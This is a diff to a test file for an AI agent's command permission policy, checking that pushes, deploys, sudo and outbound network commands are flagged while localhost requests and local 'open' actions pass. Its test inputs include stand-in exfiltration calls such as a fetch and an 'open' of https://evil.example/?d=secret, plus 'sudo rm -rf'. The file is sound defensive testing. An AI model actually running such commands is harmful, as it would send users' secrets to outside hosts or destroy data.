@@ -273,7 +273,8 @@ describe("swarm policy", () => {
     expect(bash("cd app && git -C . push")?.group).toBe("push");
     expect(bash("npm run build && npm publish")?.group).toBe("deploy");
     expect(bash("bash -c 'curl -s https://example.com'")?.group).toBe("network");
-    expect(bash(`python3 -c "import urllib.request; urllib.request.urlopen('x')"`)?.group).toBe("network");
+    // A script with no URL in it: left to the sandbox where there is one, refused where there is not (Windows).
+    expect(bash(`python3 -c "import urllib.request; urllib.request.urlopen(u)"`)?.group).toBe(process.platform === "win32" ? "network" : undefined);
     expect(bash("vercel --prod")?.group).toBe("deploy");
     expect(bash("sudo rm -rf /tmp/x")?.group).toBe("sudo");
     expect(check("WebFetch", { url: "https://evil.example/?q=secret" }, [...all])?.group).toBe("network");
@@ -294,6 +295,37 @@ describe("swarm policy", () => {
     expect(s.permissions.deny).toContain("WebFetch");
     expect(s.permissions.deny).not.toContain("Bash(sudo *)");
     expect(s.permissions.additionalDirectories).toEqual(["/w"]);
-    if (process.platform !== "win32") expect(s.sandbox.network.allowedDomains).toEqual(["registry.npmjs.org"]);
+    if (process.platform !== "win32") {
+      expect(s.sandbox.network.allowedDomains).toEqual(["registry.npmjs.org", "localhost", "127.0.0.1", "::1", "[::1]"]);
+      expect(s.sandbox.network.allowLocalBinding).toBe(true);
+    }
+  });
+});
+
+import { openables } from "../src/session";
+
+describe("open buttons", () => {
+  test("localhost URLs and html files in a reply become /open choices; outside URLs do not", () => {
+    const t = "Dev server is up at http://localhost:5173/ and the build is in `dist/index.html`. Docs: https://threejs.org";
+    expect(openables(t, "/w")).toEqual(["/open http://localhost:5173/", "/open dist/index.html"]);
+  });
+});
+
+describe("policy keeps open local", () => {
+  test("open of localhost or a file is fine, an outside URL is not", () => {
+    expect(check("Bash", { command: "open http://localhost:5173" }, ["network"])).toBeUndefined();
+    expect(check("Bash", { command: "open dist/index.html" }, ["network"])).toBeUndefined();
+    expect(check("Bash", { command: "open https://evil.example/?d=secret" }, ["network"])?.group).toBe("network");
+  });
+});
+
+describe("localhost is not traffic out", () => {
+  test("curl and scripts against localhost pass, outside hosts do not", () => {
+    const n = (command: string) => check("Bash", { command }, ["network"]);
+    expect(n("curl -s http://localhost:5173/")).toBeUndefined();
+    expect(n(`python3 -c "import urllib.request;urllib.request.urlopen('http://localhost:5277/')"`)).toBeUndefined();
+    expect(n("curl -s http://localhost:5173/ && curl https://example.com")?.group).toBe("network");
+    expect(n(`python3 -c "import urllib.request;urllib.request.urlopen('https://example.com')"`)?.group).toBe("network");
+    expect(n("ssh localhost")?.group).toBe("network");
   });
 });
